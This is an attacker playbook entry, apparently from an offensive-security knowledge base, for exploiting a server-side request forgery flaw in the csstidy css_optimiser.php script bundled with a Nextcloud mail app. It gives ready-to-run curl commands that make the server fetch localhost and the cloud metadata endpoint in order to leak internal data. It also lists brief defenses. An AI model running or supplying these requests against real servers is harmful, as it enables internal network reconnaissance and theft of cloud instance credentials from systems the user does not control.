---
id: d4e5f6g7-h8i9-0123-defg-456789012345
tags:
  - ssrf
  - recon
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
commands:
  - '[[commands/curl-ssrf-trigger]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:48.591Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-SSRF-with-URL-Parameter

## Summary

This procedure exploits the lack of URL validation in css_optimiser.php to force the Nextcloud server to make arbitrary HTTP requests, enabling internal reconnaissance.

## Description

From line 376 in the cerdic/csstidy code, the script fetches content from the provided 'url' parameter without checks, leading to SSRF. Attackers can target localhost services, internal routers, or external hosts. This allows port scanning, metadata access, or service discovery on the internal network.

## Requirements

1. Accessible endpoint from Step 2
2. Knowledge of target internal URLs (e.g., http://localhost/admin)
3. HTTP client for parameter injection

## Defense

Defensive measures and detection strategies:

- Validate and whitelist URLs in third-party libraries
- Use network segmentation to isolate internal services
- Monitor outbound requests from web servers via proxy logs

## Objectives

1. Force server-side requests to internal resources
2. Perform reconnaissance on local network
3. Validate SSRF for chaining

## Instructions

### Step 1: Basic SSRF Test

**Context**: Append url to target localhost.

**Command** ([[commands/curl-ssrf-trigger]]):
```bash
curl "http://target.com/apps/mail/vendor/cerdic/css-tidy/css_optimiser.php?url=http://localhost/test"
```

> Server fetches /test from localhost; response may echo content or error.

### Step 2: Internal Service Probe

**Context**: Target specific ports/services like metadata endpoints.

**Command** ([[commands/curl-ssrf-internal]]):
```bash
curl "http://target.com/apps/mail/vendor/cerdic/css-tidy/css_optimiser.php?url=http://169.254.169.254/latest/meta-data/"
```

> If AWS, returns instance metadata; success if internal data leaked.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-ssrf-trigger]]
- [[commands/curl-ssrf-internal]]

## Tools Used


## Tags

- ssrf
- recon

